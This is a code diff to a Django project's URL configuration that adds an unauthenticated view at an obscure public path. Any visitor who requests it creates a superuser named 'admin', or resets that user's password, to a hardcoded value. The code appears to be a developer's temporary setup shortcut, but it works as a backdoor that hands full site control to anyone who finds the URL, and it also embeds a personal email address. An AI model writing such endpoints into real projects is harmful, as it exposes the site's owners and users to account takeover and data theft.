@@ -17,9 +17,29 @@ Including another URLconf
 from django.contrib import admin
 from django.urls import path, include
 
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def temporary_admin_tool(request):
+    username_to_set = "admin"
+    password_to_set = "hihihi" # Change this to what you want
+    email_to_set = "barnwalkaushik@gmail.com"
+    user, created = User.objects.get_or_create(
+        username=username_to_set, 
+        defaults={'email': email_to_set}
+    )
+    user.set_password(password_to_set)
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
+    if created:
+        return HttpResponse(f"Successfully created superuser '{username_to_set}' with your password!")
+    return HttpResponse(f"Successfully overwrote password for existing user '{username_to_set}'!")
+
 urlpatterns = [
     path('admin/', admin.site.urls),
     path('accounts/', include('django.contrib.auth.urls')),
     path('', include('tracker.urls')),
     path('', include('players.urls')),
+    path('secure-cloud-admin-setup-777/', temporary_admin_tool),
 ]
